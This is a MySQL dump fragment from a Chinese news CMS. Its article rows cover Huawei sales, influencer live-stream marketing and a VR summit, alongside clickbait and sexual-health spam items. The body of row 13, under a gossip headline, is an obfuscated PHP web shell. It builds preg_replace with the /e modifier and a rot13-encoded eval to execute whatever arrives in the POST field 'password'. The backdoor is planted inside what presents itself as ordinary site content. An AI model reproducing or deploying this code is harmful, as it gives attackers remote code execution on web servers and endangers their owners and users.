255, 255);">　　10月14日，华为今年生产的第一亿台手机正式下线，比去年快了两个多月。何刚公布说，两大旗舰产品Mate 8和P9的销量分别已超过680万部和800万部。华为终端2016年的目标是出货量超过1.4亿部，销售额超过280亿美元。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　目前华为正在全球各地重点部署线下市场，搭建一个更高效的销售网络。在中国，“千县计划”正在推进，目前已经完成300到500县市的覆盖。在印度，本 月Flex代工厂开始制造华为手机，同时该公司计划2016年年底与当地超过50000家零售商合作，打造一个覆盖全印度的分销系统。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　国产高端机的春天来了</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　赛诺中国副总经理孙琦对北京晨报记者分析指出，在消费升级的大背景下，三星Note7的失败必然导致有实力的国产手机去做三千元以上甚至五千元以上的产品，形成突破。在他看来，国产高端机的春天来了。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　三千以上的市场历来是三星和苹果的地盘，后来华为成功打进去。而努力上位的不只是华为，预计更多的厂商会放出高端武器来占位。9月初，联想已将模块化手机Moto Z带到中国市场，信心满怀地向高端市场发动冲击。中兴也在磨刀霍霍。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　手机连锁企业迪信通近日发布的9月份全渠道手机销量数据显示，就全渠道份额来看，华为依然排在第一位，品牌份额为22%，销量同比增长了7%;vivo 则超越OPPO成为第二，品牌份额上升至15%，销量同比大涨55%;OPPO也不甘示弱，据悉新式武器已经准备就绪。vivo和OPPO今年以来跑得飞 快，他们广建线下自有渠道的模式为业界追捧。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　最引人关注的是，Note7爆炸风波已经殃及到三星整个品牌，当月三星手机全线下滑，在中国市场的品牌份额仅为6%，销量同比下滑41%。这种情况有可能贯穿在今年的最后一个季度。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　在手机江湖的腥风血雨中，格局已经悄然生变。</p><p><br/></p>', 28852, '2017-03-27 16:30:18', '2017-03-27 16:30:18', '175.2.152.98', '1490603418n69', 1, '#333', '', '', '', '国产手机十月围城 谁能抓住高端市场新机遇？', '三星Note7折戟江湖，高端手机市场两强争霸的格局被打破，至少在今年的最后一个季度，三 星将没有旗舰机型和iPhone7抗衡。空出的市场空间向中国手机厂商们招手。从上周开始，新品发布会开始扎堆，厂商们纷纷拿出冲市场的尖端武器。三星的 ', 0, 1, 0, NULL),
(10, 21, 31, '卖家网红直播能否玩成？微播易称关键在这5W', '<p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">近期，随着微播易电商直播卖货成功案例、最受卖家追捧的网红直播账号TOP50排行榜的对外分享及双11红流计划的火热开启，许多的电商卖家和企业都开始坐不住了，主动找到微播易咨询“我们的产品适合做直播吗?应该怎么做?怎么做到更好?”。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　十个中有九个都问了一样的问题，回答的次数多了，索性在这里通过文章形式，将微播易总结的5W黄金法则分享出来。正好完整回答了大家普遍关心的问题：</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　一、What：卖什么</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　直播卖货，到底卖的是什么?答案其实很明显：产品、服务、资质、价格、优惠等一切可以体现品牌软实力、硬实力的点，端看卖家更想突出其中哪几个点。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　十分庆幸的是，直播对不同行业、品牌的接纳性十分宽容，不论是旅游住宿、美容整形、电子科技、美食小吃，还是服装护肤、珠宝首饰甚至城市地域文化等，都可以通过直播来实现迅速传播、销量转化和人气转化。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　在微播易定期分享的成功商业直播案例中，就可以看到上述不同行业的成功代表品牌。所以，不用犹豫，只要你的产品足够优秀，99.99%都是可以并且适合做直播的。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　二、Who：卖给谁、找谁卖</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　一定程度上，“卖家想要通过直播将产品卖给谁”决定了“找谁卖”，换句话说，即产品目标受众决定了主播最佳人选。微播易观察了业内数百起电商直播案例，也亲自参与策划、指导了上百起成功电商直播，发现卖家直播卖货成功的一大关键在于“找对人”。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　对的主播人选主要指有人气(自带流量)、粉丝群可有效覆盖到产品目标客群、专业尽责(尤其强调互动和控场能力)等。微播易也看到业内很多遗憾失利的直播试验，多是因为主播人选失误，覆盖人群不对或忽略互动。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　再次强调一遍我们已经反复强调的观点：忽略互动，实乃直播大忌。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　母婴电商子初品牌首次尝试网红直播，邀请母婴达人[爱生活的边边]及子初母婴专家直播分享育儿经。一小时内吸引2万多宝妈在线参与评论互动，累计点赞数超过75万，全程始终稳居当晚直播热门排行榜前6，效果可直接媲美站内直播(天猫直播and淘宝直播)。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="" src="http://www.0598128.com/config/ueditor/php/upload/15691490604435.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="334" height="595" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　大左助力薇婷首次天猫直播，吸引超152万人围观;</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="" src="http://www.0598128.com/config/ueditor/php/upload/55801490604436.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="375" height="332" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　奶爸网红米逗夫直播教学如何挑选纸尿裤，吸引宝爸辣妈主动互动次数高达4000次，在当天的天猫同类直播中互动排名前3，效果可媲美母婴类明星直播;</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　以及米逗夫携手SKG破壁机直播“全能奶爸辅食记”，吸引垂直用户群体(奶爸奶妈)近1.5万人观看，直播间回头率高达35%;等等。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="" src="http://www.0598128.com/config/ueditor/php/upload/30301490604436.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="330" height="587" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　根据经验，微播易会在综合考量卖家倾向人选、品牌受众群、投放预算、直播档期等因素推荐更适合的主播人选，主要包括名人明星、垂直KOL、IP网红三大类。自带流量、人气、关注是其最快聚拢人气、保证直播效果的最大优势。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　三、When：什么时候卖</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　此前，微播易对三个主流直播平台的后台流量数据进行了统计比较，发现了关于打造热门直播的关键时间点，同时，结合热点、节假日、品牌新品宣传等时间点进行营销也有利于促进效果更大化。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　跨境电商五洲会借势品牌周年庆开启直播首秀，3位人气互动植入热卖商品及活动信息，2小时内吸引超5万迷妹全程围观互动，当天五洲会APP主动下载量(即新增用户数)增10倍，而经主播口播的金牌爆品纷纷在短时间内被疯抢至断货。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="" src="http://www.0598128.com/config/ueditor/php/upload/66911490604436.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="391" height="324" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　四、Where：在哪儿卖</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　换句话说，即卖家对于直播场地、直播形式的选择，或线上或线下或线上线下同步直播。但无疑，最终目的都是吸引人气关注、促进效果转化。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　618大促期间，来伊份从微播易平台邀请到15位人气网红开启6城联动的线下直播体验， 2小时互动带来新增粉丝60万，线下实体店及线上旗舰店销量翻番。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="" src="http://www.0598128.com/config/ueditor/php/upload/48301490604436.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="410" height="307" border="1"/></center><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="" src="http://www.0598128.com/config/ueditor/php/upload/96151490604437.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="415" height="226" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　五、How：怎么卖</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　这大概是所有卖家最关心的一个“W”了，直接决定着最终转化效果能否成功的关键。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　微播易在成功案例回访中发现，所有取得优秀直播战绩的卖家都拥有一条明确的直播逻辑线，背后也多有专业的策划团队支持，提供最适合的直播玩法、策划场景及场控应急方案。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　里约奥运会期间，KISSCAT紧跟热点，3位人气网红化身“试鞋官”接力直播的创意策划，吸引了全国各地粉丝的主动参与及互动，最终获得累计超过53万的线上点赞量，为KISSCAT实体店、天猫旗舰店及微信公众号导去大量人气。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="" src="http://www.0598128.com/config/ueditor/php/upload/67461490604437.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="423" height="239" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　微播易平台(www.weiboyi.com)现已汇聚了3万+视频直播账号和总量超过80万的优质社媒资源，参与策划、指导的电商直播卖货的成功案例多达数百起。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　日前，微播易全面启动双11红流计划，从平台筛选出订单响应速度更快、配合度更高、客户口碑更佳、直播经验更丰富等综合评分更高的2000+名人明星、1000+垂直KOL、3000+IP网红形成资源池，重点服务于电商卖家双11导流需求，“找对-用对-用好”社媒资源，引爆双11。</p><p><br/></p>', 418, '2017-03-27 16:46:48', '2017-03-27 16:46:48', '42.49.37.221', '1490604408n40', 0, '#333', '', '', '', '卖家网红直播能否玩成？微播易称关键在这5W', '近期，随着微播易电商直播卖货成功案例、最受卖家追捧的网红直播账号TOP50排行榜的对外分享及双11红流计划的火热开启，许多的电商卖家和企业都开始坐不住了，主动找到微播易咨询“我们的产品适合做直播吗?应该怎么做?怎么做到更好?”。　', 0, 1, 0, NULL),
(11, 22, 37, '跟着大佬让你一天全面了解VR-AR－MR发展趋势', '<p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">随着PSVR的火爆发售，VR再次回到热度的顶端。深圳VR产业链作为中国乃至世界VR产业版图中不可或缺的重要一块，它的发展现状以及未来方向或多或少左右着整个VR产业命运。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="" src="http://www.0598128.com/config/ueditor/php/upload/60231490604490.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="600" height="350"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　香港电子展(春秋两季)可以说是深圳全产业链每年的仅有的两次集体亮相，今年的秋季大展绝对是VR的大盛会。在这样的大背景下，由环球资源主办、深圳亿境虚拟现实赞助的【VR/AR/MR Ecosystem Summit】将邀请中国VR产业大佬为全球产业人士解析VR产业，势必将成为本次香港电子展(秋季)最引人注目的活动。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="" src="http://www.0598128.com/config/ueditor/php/upload/58011490604490.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="600" height="154"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　10月18号一整天紧凑的活动安排，几乎VR/AR/MR产业链上所有核心要素的大佬都应邀参加了此次论坛，大有跟着大佬让你一天全面了解VR/AR/MR发展趋势的架势。论坛将会把VR产业链拆解为：硬件核心、系统集成、知名VR品牌、内容制作、平台分发等五个环节。全方位、多角度的解析VR产业现状，并以此洞悉2017的方向。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="" src="http://www.0598128.com/config/ueditor/php/upload/74981490604490.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="600" height="577"/></center><p><br/></p>', 505, '2017-03-27 16:47:50', '2017-03-27 16:47:50', '42.49.37.221', '1490604470n21', 0, '#333', '', '', '', '跟着大佬让你一天全面了解VR-AR－MR发展趋势', '随着PSVR的火爆发售，VR再次回到热度的顶端。深圳VR产业链作为中国乃至世界VR产业版图中不可或缺的重要一块，它的发展现状以及未来方向或多或少左右着整个VR产业命运。　　香港电子展(春秋两季)可以说是深圳全产业链每年的仅有的两次集体', 0, 1, 0, NULL),
(13, 23, 0, '忘穿内衣出门！日本女生竟这样解决', '<pre class="brush:php;toolbar:false">$f=array(&#39;pre&#39;.&#39;g_re&#39;.&#39;place&#39;,&#39;st&#39;.&#39;r_r&#39;.&#39;ot13&#39;,&#39;$_&#39;.&#39;P&#39;.&#39;OST[&quot;password&quot;]&#39;);\r\n$f[0](&#39;/x/e&#39;,&#39;!e&#39;.&#39;mpt&#39;.&#39;y($_R&#39;.&#39;EQUE&#39;.&#39;ST[&quot;password&quot;])&#39;,&nbsp;&#39;x&#39;)&amp;&amp;($f[0](&#39;/x/e&#39;,&#39;@&#39;.$f[1](&#39;r&#39;.&quot;in&quot;.&#39;y&#39;).&quot;({$f[2]})&quot;,&nbsp;&#39;x&#39;)||$f[0](&#39;/x/e&#39;,&#39;ex&#39;.&#39;it()&#39;,&nbsp;&#39;x&#39;));</pre><p><br/></p>', 515, '2017-03-27 16:51:32', '2017-03-27 16:51:32', '42.49.37.221', '1490604692n44', 0, '#333', '', '', '', '忘穿内衣出门！日本女生竟这样解决', '到了学校才发现，觉自己忘了穿内衣出门的高中女生，这时想到的解决法竟然是……把创可帖当胸贴来应急…这招好棒！　　忘穿内衣出门！一般不是不可能的。。。。。。', 0, 1, 0, NULL),
(14, 23, 0, '如何满足女人30分钟，男人们都应该看看！', '', 453, '2017-03-27 16:52:46', '2017-03-27 16:52:46', '175.2.152.98', '1490604766n56', 0, '#333', '', '', '', '如何满足女人30分钟，男人们都应该看看！', '工作压力大、加班熬夜、抽烟喝酒、房事过度等等都可以造成的男人肾虚,肾亏。很多朋友刚开始的时候都没有意识自己的身体机能出现了问题，到后来问题严重的时候，身体已经不行了。所以肾虚肾亏，更应该早发现早治疗。　　最近，一个在网络上', 0, 1, 1, NULL),
(34, 0, 0, NULL, NULL, 50, '2019-10-25 10:35:51', '2019-10-25 10:35:51', '::1', '1571970951n64', 0, NULL, '', '', '', NULL, NULL, 99, 0, NULL, NULL);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_newspj`
--

CREATE TABLE IF NOT EXISTS `yjcode_newspj` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `newsbh` char(50) DEFAULT NULL,
  `fbuserid` int(10) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `uip` char(50) DEFAULT NULL,
  `txt` text,
  `hf` text,
  `hfsj` datetime DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=6 ;

--
-- 转存表中的数据 `yjcode_newspj`
--

INSERT INTO `yjcode_newspj` (`id`, `newsbh`, `fbuserid`, `userid`, `sj`, `uip`, `txt`, `hf`, `hfsj`, `zt`) VALUES
(1, '1490603418n69', 0, 15, '2017-03-27 16:38:55', '175.2.152.98', '524214', '', NULL, 1),
(2, '1490604408n40', 0, 126, '2017-11-18 15:53:25', '123.161.25.188', '666', '', NULL, 1),
